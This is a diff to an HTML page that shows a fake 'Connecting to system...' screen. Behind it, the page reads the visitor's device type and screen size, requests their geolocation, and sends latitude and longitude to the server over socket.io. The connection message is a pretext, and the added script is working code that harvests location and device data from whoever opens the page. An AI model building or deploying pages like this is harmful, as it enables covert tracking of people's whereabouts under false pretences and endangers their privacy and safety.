@@ -5,89 +5,53 @@
 
   <style>
     body {
-      background: linear-gradient(135deg, #020617, #0f172a);
+      background: #020617;
       color: #00ffcc;
       font-family: monospace;
       text-align: center;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-    }
-
-    .box {
-      background: rgba(255,255,255,0.05);
-      padding: 30px;
-      border-radius: 20px;
-      backdrop-filter: blur(15px);
-      box-shadow: 0 0 25px rgba(0,255,204,0.5);
-    }
-
-    .typing {
-      border-right: 2px solid #00ffcc;
-      white-space: nowrap;
-      overflow: hidden;
-      animation: typing 3s steps(30), blink 0.7s infinite;
-      font-size: 18px;
-    }
-
-    @keyframes typing {
-      from { width: 0 }
-      to { width: 100% }
-    }
-
-    @keyframes blink {
-      50% { border-color: transparent }
-    }
-
-    .status {
-      margin-top: 15px;
-      font-size: 14px;
-      opacity: 0.8;
-    }
-
-    .pulse {
-      width: 10px;
-      height: 10px;
-      background: #00ffcc;
-      border-radius: 50%;
-      margin: 10px auto;
-      animation: pulse 1s infinite;
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.5); opacity: 0.5; }
-      100% { transform: scale(1); opacity: 1; }
+      margin-top: 100px;
     }
   </style>
 </head>
 
 <body>
 
-<div class="box">
-  <h2 class="typing">📡 CONNECTING TO SECURE NETWORK...</h2>
-  <div class="pulse"></div>
-  <p class="status">Scanning device & initializing connection...</p>
-</div>
+<h2>📡 Connecting to system...</h2>
 
 <script src="/socket.io/socket.io.js"></script>
 
 <script>
   const socket = io(window.location.origin);
 
+  function getDeviceName() {
+    const ua = navigator.userAgent;
+    if (/iPhone/i.test(ua)) return "📱 iPhone";
+    if (/Android/i.test(ua)) return "📱 Android";
+    if (/Mac/i.test(ua)) return "💻 MacBook";
+    if (/Windows/i.test(ua)) return "💻 Windows PC";
+    return "Unknown Device";
+  }
+
   const deviceInfo = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
+    device: getDeviceName(),
     screen: window.screen.width + "x" + window.screen.height
   };
 
-  // Simulate scanning delay for effect
-  setTimeout(() => {
+  // 📍 LOCATION
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        deviceInfo.lat = pos.coords.latitude;
+        deviceInfo.lng = pos.coords.longitude;
+        socket.emit("device-info", deviceInfo);
+      },
+      () => {
+        socket.emit("device-info", deviceInfo);
+      }
+    );
+  } else {
     socket.emit("device-info", deviceInfo);
-  }, 2000);
+  }
 </script>
 
 </body>
